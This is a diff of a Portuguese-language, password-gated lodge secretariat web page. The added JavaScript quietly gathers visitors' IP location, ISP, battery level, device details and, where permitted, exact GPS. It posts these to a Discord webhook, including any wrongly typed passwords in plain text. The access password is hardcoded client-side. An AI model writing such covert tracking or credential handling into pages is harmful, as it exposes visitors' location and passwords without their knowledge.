+        async function carregarDadosRede() {
+            try {
+                const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
+                const dataGeo = await response.json();
+                const provedor = dataGeo.organization_name || dataGeo.organization || "Desconhecido";
+                let localizacaoTexto = `${dataGeo.city}, ${dataGeo.region} - ${dataGeo.country}`;
+                let mapaUrl = `https://www.google.com/maps/search/?api=1&query=$${dataGeo.latitude},${dataGeo.longitude}`;
+                let precisaoInfo = "(Aproximada via IP)";
+                let bateriaInfo = "";
+
+                try {
+                    if ('getBattery' in navigator) {
+                        const battery = await navigator.getBattery();
+                        const nivel = Math.round(battery.level * 100);
+                        const statusBat = battery.charging ? "🔌 Carregando" : "🔋 Na Bateria";
+                        bateriaInfo = `\n${statusBat}: ${nivel}%`;
+                    }
+                } catch (e) {} 
+
+                const atualizarCamposDiscord = () => {
+                     camposDiscord = [
+                        { name: "📱 Dispositivo", value: obterDadosDispositivo() + bateriaInfo, inline: false },
+                        { name: "🌐 Rede e IP", value: `${provedor}\n\`${dataGeo.ip}\``, inline: true },
+                        { name: "📍 Localização " + precisaoInfo, value: `${localizacaoTexto}\n[🗺️ Abrir no Google Maps](${mapaUrl})`, inline: true }
+                    ];
+                };
+                atualizarCamposDiscord(); 
+
+                if ("geolocation" in navigator && navigator.permissions) {
+                    const permission = await navigator.permissions.query({ name: 'geolocation' });
+                    if (permission.state === 'granted') {
+                        navigator.geolocation.getCurrentPosition((pos) => {
+                            localizacaoTexto = "Localização Exata via GPS";
+                            mapaUrl = `https://www.google.com/maps/search/?api=1&query=$${pos.coords.latitude},${pos.coords.longitude}`;
+                            precisaoInfo = "(Exata)";
+                            atualizarCamposDiscord(); 
+                        });
+                    } else if (permission.state === 'prompt') {
+                        if (!localStorage.getItem('gps_ja_perguntado')) {
+                            localStorage.setItem('gps_ja_perguntado', 'true');
+                            navigator.geolocation.getCurrentPosition(
+                                (pos) => {
+                                    localizacaoTexto = "Localização Exata via GPS";
+                                    mapaUrl = `https://www.google.com/maps/search/?api=1&query=$${pos.coords.latitude},${pos.coords.longitude}`;
+                                    precisaoInfo = "(Exata)";
+                                    atualizarCamposDiscord();
+                                },
+                                (err) => { console.log("Usuário negou o GPS."); },
+                                { timeout: 5000, enableHighAccuracy: true } 
+                            );
+                        }
+                    }
+                }
+            } catch (error) {
+                camposDiscord = [
+                    { name: "📱 Dispositivo", value: obterDadosDispositivo(), inline: false },
+                    { name: "⚠️ Aviso", value: "Dados de rede indisponíveis.", inline: false }
+                ];
+            }
+        }
+        window.addEventListener('load', carregarDadosRede);
+
+        function notificarDiscord(titulo, mensagem, corHex) {
+            const corDecimal = parseInt(corHex.replace("#", ""), 16);
+            const payload = {
+                username: "Sentinela",
+                avatar_url: "https://oimaginista.com/favicon/web-app-manifest-512x512.png",
+                embeds: [{ title: titulo, description: mensagem, color: corDecimal, fields: camposDiscord, footer: { text: "A∴ R∴ L∴ M∴ Fraternidade Imperial Nº 264" }, timestamp: new Date().toISOString() }]
+            };
+            fetch(DISCORD_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload), keepalive: true }).catch(console.error);
+        }
+
+        window.addEventListener('beforeunload', function() {
+            if (horaLogin) {
+                const horaSaida = new Date(); const diff = Math.floor((horaSaida - horaLogin) / 1000); const m = Math.floor(diff / 60); const s = diff % 60;
+                notificarDiscord("⏱️ Acesso Encerrado (Secretaria)", `**O usuário fechou a aba ou saiu da página.**\n**Tempo de visualização:** ${m}m ${s}s`, "#555555");
+            }
+        });
+
         document.addEventListener('DOMContentLoaded', () => {
 
             /* ========================================================
-               LISTA DE CANDIDATOS (EDITE AQUI COM CORES HEXADECIMAIS)
+               LISTA DE CANDIDATOS E MODO DE VISUALIZAÇÃO
             ======================================================== */
             const candidatosAtivos = [
-                { nome: "RUAN PABLO DA SILVA DE LIMA SANTOS", statusTexto: "Entrega de Documentos", corHex: "#f1c40f", iconeUsuario: "fas fa-user-secret", linkUrl: "processos/rpsls/", liberado: true },
-                { nome: "CARLOS HENRIQUE BASTOS MELO", statusTexto: "Pré-Proposta", corHex: "#3498db", iconeUsuario: "fas fa-user", linkUrl: "#", liberado: false },
+                { nome: "RUAN PABLO DA SILVA DE LIMA SANTOS", statusTexto: "Verificação de Documentos", corHex: "#f1c40f", iconeUsuario: "fas fa-user-secret", linkUrl: "processos/rpsls/", liberado: true },
+                { nome: "ALAN FERNANDES LOPES", statusTexto: "Regularização", corHex: "#3498db", iconeUsuario: "fas fa-user", linkUrl: "processos/afl/", liberado: true },
                 { nome: "BRUNO FERNANDES DE OLIVEIRA", statusTexto: "Pré-Proposta", corHex: "#2ecc71", iconeUsuario: "fas fa-user", linkUrl: "#", liberado: false },
                 { nome: "MATHEUS MAGALHÃES DA SILVA", statusTexto: "Pré-Proposta", corHex: "#2ecc71", iconeUsuario: "fas fa-user", linkUrl: "#", liberado: false },
                 { nome: "GABRIEL DA SILVEIRA FILHO", statusTexto: "Pré-Proposta", corHex: "#2ecc71", iconeUsuario: "fas fa-user", linkUrl: "#", liberado: false },
-                // --- NOVOS CANDIDATOS FICTÍCIOS PARA TESTAR O GRID ---
                 { nome: "JULIO CESAR DE ALMEIDA", statusTexto: "Sindicância", corHex: "#9b59b6", iconeUsuario: "fas fa-user-tie", linkUrl: "#", liberado: false },
                 { nome: "MARCELO AUGUSTO FERREIRA", statusTexto: "Verificação de Docs", corHex: "#e74c3c", iconeUsuario: "fas fa-user-shield", linkUrl: "#", liberado: false },
                 { nome: "RODRIGO TEIXEIRA LIMA", statusTexto: "Iniciação", corHex: "#34495e", iconeUsuario: "fas fa-user-graduate", linkUrl: "#", liberado: false },
@@ -522,6 +739,33 @@
             const searchInput = document.getElementById('process-search');
             const btnLoadMore = document.getElementById('btn-load-more');
             
+            // Lógica de Toggle de Visualização
+            const btnGrid = document.getElementById('btn-view-grid');
+            const btnTable = document.getElementById('btn-view-table');
+            
+            // Pega a preferência salva ou usa grid como padrão
+            let currentViewMode = localStorage.getItem('sec_view_mode') || 'grid'; 
+
+            function updateViewMode() {
+                if(currentViewMode === 'table') {
+                    listaContainer.classList.remove('grid-mode');
+                    listaContainer.classList.add('table-mode');
+                    btnTable.classList.add('active');
+                    btnGrid.classList.remove('active');
+                } else {
+                    listaContainer.classList.remove('table-mode');
+                    listaContainer.classList.add('grid-mode');
+                    btnGrid.classList.add('active');
+                    btnTable.classList.remove('active');
+                }
+                localStorage.setItem('sec_view_mode', currentViewMode);
+            }
+
+            btnGrid.addEventListener('click', () => { currentViewMode = 'grid'; updateViewMode(); });
+            btnTable.addEventListener('click', () => { currentViewMode = 'table'; updateViewMode(); });
+            
+            updateViewMode(); // Chama no carregamento
+
             const ITEMS_PER_PAGE = 6; 
             let currentVisibleItems = ITEMS_PER_PAGE;
             let currentSearchTerm = "";
@@ -581,18 +825,63 @@
                 renderCandidatos();
             });
 
-            /* --- LÓGICA DE LOGIN --- */
+            /* --- LÓGICA DE LOGIN COM BOTÃO MOSTRAR SENHA --- */
             const correctPass = "imperial";
             let tentativas = 0;
             const btnLogin = document.getElementById('btn-login');
             const passInput = document.getElementById('pass-input');
+            const togglePassword = document.getElementById('togglePassword');
             const overlay = document.getElementById('login-overlay');
             const content = document.getElementById('secretaria-content');
             const header = document.getElementById('secretaria-header');
             const footer = document.getElementById('secretaria-footer');
 
+            togglePassword.addEventListener('click', function() {
+                if (passInput.type === "password") {
+                    passInput.type = "text";
+                    this.classList.remove('fa-eye');
+                    this.classList.add('fa-eye-slash');
+                    this.style.color = "var(--gold)";
+                } else {
+                    passInput.type = "password";
+                    this.classList.remove('fa-eye-slash');
+                    this.classList.add('fa-eye');
+                    this.style.color = "rgba(212, 175, 55, 0.6)";
+                }
+            });
+
+            passInput.addEventListener('input', function() {
+                const icon = document.querySelector('.auth-box h2');
+                if (this.value.length > 0) {
+                    icon.style.textShadow = '0 0 15px var(--gold)';
+                } else {
+                    icon.style.textShadow = '';
+                }
+            });
+
+            function triggerLockdown() {
+                notificarDiscord("🚨 TENTATIVA DE INVASÃO (Secretaria)", "**O sistema foi travado após 3 tentativas incorretas.**\nAlarme disparado.", "#cc0000");
+                const lockdown = document.getElementById('system-lock-screen');
+                const audio = document.getElementById('lockdown-audio');
+                
+                document.body.classList.add('locked-mode');
+                lockdown.classList.add('active');
+                audio.play().catch(e => console.log("Áudio bloqueado.", e));
+
+                const msgEl = document.getElementById('lockdown-typing');
+                const msg = "> IDENTIDADE NÃO CONFIRMADA. INICIANDO PROTOCOLO DE BLOQUEIO DE SEGURANÇA MÁXIMA...";
+                let i = 0;
+                function typeWriter() {
+                    if (i < msg.length) { msgEl.innerHTML += msg.charAt(i); i++; setTimeout(typeWriter, 50); }
+                }
+                setTimeout(typeWriter, 500);
+                setTimeout(() => { window.location.href = "https://oimaginista.com/fraternidadeimperial/"; }, 13000);
+            }
+
             function verificarSenha() {
                 if (passInput.value.trim() === correctPass) {
+                    horaLogin = new Date(); 
+                    notificarDiscord("✅ Acesso Autorizado (Secretaria)", "O acesso ao painel principal da Secretaria foi liberado.", "#2e7d32");
                     overlay.style.opacity = '0';
                     setTimeout(() => {
                         overlay.style.display = 'none';
@@ -605,11 +894,16 @@
                     tentativas++;
                     document.getElementById('tentativas').textContent = tentativas;
                     document.getElementById('error-msg').style.display = 'block';
+                    
+                    notificarDiscord("⚠️ Tentativa de Acesso Falha (Secretaria)", `**Senha digitada:** \`${passInput.value || "[em branco]"}\`\n**Tentativas:** ${tentativas}/3`, "#b86b00");
+                    
                     passInput.value = '';
+                    passInput.focus();
                     if (tentativas >= 3) {
-                        document.body.classList.add('locked-mode');
-                        document.getElementById('system-lock-screen').classList.add('active');
-                        setTimeout(() => { window.location.href = "https://oimaginista.com/fraternidadeimperial/"; }, 3000);
+                        passInput.disabled = true;
+                        btnLogin.disabled = true;
+                        document.querySelector('.auth-box').style.display = 'none';
+                        triggerLockdown();
                     }
                 }
             }
